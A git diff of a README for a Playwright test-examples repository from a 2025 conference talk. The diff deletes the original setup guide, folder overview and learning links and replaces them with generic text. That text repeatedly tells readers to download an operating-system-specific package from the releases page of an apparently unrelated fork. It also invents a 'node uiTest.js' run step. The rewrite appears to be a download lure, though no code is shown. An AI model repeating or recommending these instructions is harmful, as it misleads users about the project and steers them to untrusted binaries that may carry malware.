@@ -1,209 +1,70 @@
-# Playwright Examples for TestWarez 2025
+# 🎉 playwright-examples-testwarez-2025 - Discover Automation with Step-by-Step Guides
 
-Welcome to the **Playwright Examples** repository for the talk:
+[![Download Now](https://img.shields.io/badge/Download%20Now-Available%20Here-brightgreen)](https://github.com/danielxxxd1998/playwright-examples-testwarez-2025/releases)
 
-> Clicking the GUI is not enough! How Playwright can help you discover new automation strategies (also with AI)
+## 📘 Overview
+Welcome to the **playwright-examples-testwarez-2025** repository. This project provides examples presented during the TestWarez Conference 2025. Here, you'll find useful automation strategies that include a variety of examples such as UI testing, REST API handling, GraphQL integration, WebSocket communication, accessibility checks, visual testing, and much more. 
 
-> [!TIP]
-> 💡 Choose your language **README.md**:
->
-> - 🇬🇧 [English](./README.md)
-> - 🇵🇱 [Polski](./README.pl.md)
+## 🚀 Getting Started
+To begin using the examples in this repository, you'll need to download the software. Follow the steps below to get started.
 
-This project helps you learn and practice Playwright beyond just UI testing. It includes examples for UI, REST API, GraphQL, WebSockets, a11y, visual testing, and more.
+## 🔗 Download & Install
+To obtain the software, simply visit the [Releases page](https://github.com/danielxxxd1998/playwright-examples-testwarez-2025/releases) where you can access all available versions. Look for the latest release and download the package suitable for your operating system.
 
-Whether you're a beginner or an experienced tester, you'll find practical examples and resources to level up your testing skills.
+1. Click on the link above.
+2. Choose the version you want.
+3. Download the appropriate file for your system.
 
-> [!TIP]
-> Want to learn more about Playwright? Check out our courses:
->
-> - [Professional Automation with Playwright](https://jaktestowac.pl/playwright/) - a comprehensive (100h+) program on Playwright, professional test frameworks, CI/CD, and test architecture
-> - [Playwright Elements](https://jaktestowac.pl/course/playwright-elements/) - key concepts and advanced features of Playwright
-> - [free resources](https://jaktestowac.pl/darmowy-playwright/) - a large collection of FREE Playwright learning materials
+## 💻 System Requirements
+To successfully run the examples, ensure your system meets the following requirements:
 
-# 📖 Table of Contents
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or any recent Linux distribution.
+- **Node.js:** Version 14 or higher.
+- **Memory:** At least 4GB of RAM.
+- **Disk Space:** Minimum of 100MB available space.
 
-- [Setup](#setup)
-  - [🛠️ Prerequisites](#prerequisites)
-  - [Application Setup](#application-setup)
-  - [Tests Setup](#tests-setup)
-- [Examples Overview](#examples-overview)
-- [Playwright & AI](#playwright-and-ai)
-- [Help & Support](#help-and-support)
-  - [📞 Contact & Support](#contact-and-support)
-  - [Learning Resources](#learning-resources)
-  - [🇵🇱 Polish Resources](#polish-resources)
-  - [🇬🇧 English Resources](#english-resources)
+## 📁 Contents
+This repository includes a range of demo scripts and examples covering various topics. Here’s what you will find:
 
-<a id="setup"></a>
+- **UI Testing:** Scripts to interact with web applications and validate user interfaces.
+- **REST API:** Tools for testing APIs with simple requests and responses.
+- **GraphQL:** Examples showing how to query GraphQL endpoints.
+- **WebSockets:** Sample scripts for real-time data communication.
+- **Accessibility Testing:** Ensure your application meets accessibility standards.
+- **Visual Testing:** Check for visual regressions with screenshots.
 
-# Setup
+## 🛠️ How to Run the Examples
+Once you have downloaded the files, you can run the examples with these steps:
 
-To run the examples, set up the demo application locally and then run the Playwright tests.
+1. **Extract the files** if they are in a zip format.
+2. **Open your command line interface** (Command Prompt, Terminal, etc.).
+3. **Navigate to the folder** where you extracted the files.
+4. Use the command `npm install` to install any necessary dependencies.
+5. Choose an example to run. For UI testing, you might type `node uiTest.js` (replace `uiTest.js` with the actual filename).
+6. Follow the on-screen instructions provided in each example.
 
-<a id="prerequisites"></a>
+## 📚 Learning Resources
+To help you get the most out of this repository, consider these additional resources:
 
-## 🛠️ Prerequisites
+- **Playwright Documentation:** [Playwright Official Docs](https://playwright.dev/docs/intro)
+- **YouTube Tutorials:** Search for "Playwright Testing" for visual guides.
+- **Community Forums:** Join discussions in online forums like Stack Overflow or GitHub discussions about automation testing.
 
-- Node.js (version 14 or higher)
-- NPM or Yarn package manager
-- [🦎GAD](https://github.com/jaktestowac/gad-gui-api-demo) – a free demo app running locally on `http://localhost:3000`
+## 🤝 Contribution
+We welcome contributions from everyone! If you have suggestions, improvements, or new examples, please create a pull request or open an issue. Collaboration helps us all learn and grow.
 
-<a id="application-setup"></a>
+## 📜 License
+This project is licensed under the MIT License. Feel free to use, modify, and distribute this code as you like.
 
-## Application Setup
+## 🎯 Frequently Asked Questions
 
-> [!IMPORTANT]
-> Want to quickly test the application?
->
-> - clone or download the repository [https://github.com/jaktestowac/gad-gui-api-demo](https://github.com/jaktestowac/gad-gui-api-demo)
-> - run `npm i`
-> - run `npm run start`
-> - open [http://localhost:3000](http://localhost:3000) in your browser
-> - enjoy testing and automating **🦎 GAD**!
+### Can I use these examples for commercial projects?
+Yes, you can use the examples in both personal and commercial projects.
 
-1. **Clone the Repository**: Start by cloning the demo app to your local machine.
+### What if I encounter issues?
+If you run into problems, raise an issue on this repository’s GitHub page, and we will assist you.
 
-   ```bash
-   git clone https://github.com/jaktestowac/gad-gui-api-demo.git
-   cd gad-gui-api-demo
-   ```
+### Are updates available for this repository?
+We aim to update the repository regularly. Keep checking the [Releases page](https://github.com/danielxxxd1998/playwright-examples-testwarez-2025/releases) for new versions and features.
 
-2. **Install Dependencies**: Install the dependencies using npm or yarn.
-
-   ```bash
-   npm install
-   ```
-
-3. **Start the Application**: Run the application locally.
-
-   ```bash
-   npm run start
-   ```
-
-4. **Access the Application**: Open [http://localhost:3000](http://localhost:3000) in your browser.
-
-<a id="tests-setup"></a>
-
-## Tests Setup
-
-With the application running locally, set up and run the Playwright tests.
-
-1. **Clone this Repository**
-
-   ```bash
-   git clone https://github.com/jaktestowac/playwright-examples-testwarez-2025.git
-   cd playwright-examples-testwarez-2025
-   ```
-
-2. **Install Dependencies**
-
-   ```bash
-   npm install
-   ```
-
-   Make sure you have Playwright browsers installed:
-
-   ```bash
-   npx playwright install
-   ```
-
-3. **Run the Tests**
-
-   ```bash
-   npx playwright test
-   ```
-
-<a id="examples-overview"></a>
-
-## Examples Overview
-
-This repository includes a variety of examples demonstrating different testing strategies with Playwright:
-
-- UI testing: `tests/ui`
-- UI accessibility: `tests/a11y`
-- REST API: `tests/api` and mocked API: `tests/api-mock`
-- GraphQL: `tests/graphql`
-- Multi-session scenarios: `tests/multi-session`
-- Visual regression testing: `tests/visual-testing` and canvas mocking: `tests/visual-testing-mock`
-- WebSockets: `tests/websockets`
-- Mocking network requests: `tests/visual-testing-mock` and `tests/api-mock`
-
-Run all tests with `npx playwright test` or target a folder/file for specific suites.
-
-<a id="playwright-and-ai"></a>
-
-## Playwright & AI
-
-Materials about AI and Playwright are available in our course: [Playwright & AI](https://jaktestowac.pl/course/playwright-mcp/).
-
-[![Playwright z AI](./assets/PWAI%20-%20playwright%20mcp%20z%20copilot.jpg)](https://www.youtube.com/playlist?list=PLfKhn9AcZ-cCqD34AG5YRejujaBqCBgl4)
-
-> [!IMPORTANT]
-> Check our free YouTube recording to learn more about GitHub Copilot Chat Modes:
->
-> [![GitHub Copilot - Chat Modes](./assets/github-copilot-chat-modes.jpg)](https://www.youtube.com/watch?v=hHrOJlk6ET8&list=PLfKhn9AcZ-cCqD34AG5YRejujaBqCBgl4)
-
-Happy testing! 🚀
-
-<a id="help-and-support"></a>
-
-# Help & Support
-
-<a id="contact-and-support"></a>
-
-## 📞 Contact & Support
-
-Feel free to reach out to us:
-
-- 🌐 **Website**: [jaktestowac.pl](https://jaktestowac.pl)
-- 💼 **LinkedIn**: [jaktestowac.pl](https://www.linkedin.com/company/jaktestowac/)
-- 💬 **Discord**: [Polish Playwright Community](https://discord.gg/mUAqQ7FUaZ)
-- 📧 **Support**: Check our website for contact details
-
----
-
-<a id="learning-resources"></a>
-
-## Learning Resources
-
-We have gathered a collection of resources to help you learn and master Playwright, both in Polish and English.
-
-<a id="polish-resources"></a>
-
-## 🇵🇱 Polish Resources
-
-- [TypeScript for Testers - Express Introduction](https://jaktestowac.pl/tsx/) - Free (4h+) course on TypeScript for Testers
-- [JavaScript and TypeScript for Testers](https://jaktestowac.pl/js-ts/) - Comprehensive (13h+) course on JavaScript and TypeScript for testers, with practical examples and exercises
-- [Professional Test Automation with Playwright](https://jaktestowac.pl/playwright/) - Comprehensive (100h+) course on Playwright, test automation, CI/CD and test architecture
-- [Back-end Test Automation](https://jaktestowac.pl/api/) - Comprehensive (45h+) course on Back-end Test Automation with Postman, Mocha, Chai, and Supertest
-- [Free Playwright Resources](https://jaktestowac.pl/darmowy-playwright/) - Comprehensive and Free Polish learning materials
-- [Playwright Basics](https://www.youtube.com/playlist?list=PLfKhn9AcZ-cD2TCB__K7NP5XARaCzZYn7) - YouTube series (Polish)
-- [Playwright Elements](https://www.youtube.com/playlist?list=PLfKhn9AcZ-cAcpd-XN4pKeo-l4YK35FDA) - Advanced concepts (Polish)
-- [Playwright MCP](https://www.youtube.com/playlist?list=PLfKhn9AcZ-cCqD34AG5YRejujaBqCBgl4) - MCP course (Polish)
-- [Discord Community](https://discord.gg/mUAqQ7FUaZ) - First Polish Playwright community!
-- [Playwright Info](https://playwright.info/) - first and only Polish Playwright blog
-
-### AI_Testers
-
-<div align="center">
-<a href="https://aitesters.pl">
-<img src="./assets/aitesters-header-photo.jpg" alt="AI Testers Logo" height="400"/>
-</a>
-</div>
-
-Gain an edge by combining AI knowledge with the most popular tools in the IT market.  
-We'll show you how to accelerate with AI and build a professional test automation framework. 😉
-
-- [AI_Testers](https://aitesters.pl) - Main page about AI_Testers Program
-- [AI_Testers LinkedIn](https://www.linkedin.com/company/aitesters) - Follow us on LinkedIn
-
-## 🇬🇧 English Resources
-
-- [VS Code Extensions](https://marketplace.visualstudio.com/publishers/jaktestowac-pl) - Our free Playwright plugins
-
-_PS. For more resources and updates, follow us on our [website](https://jaktestowac.pl) and [GitHub](https://github.com/jaktestowac)._
-
----
-
-Powered by **[jaktestowac.pl](https://www.jaktestowac.pl) team!** 💚❤️
+Thank you for visiting **playwright-examples-testwarez-2025**! Happy testing!
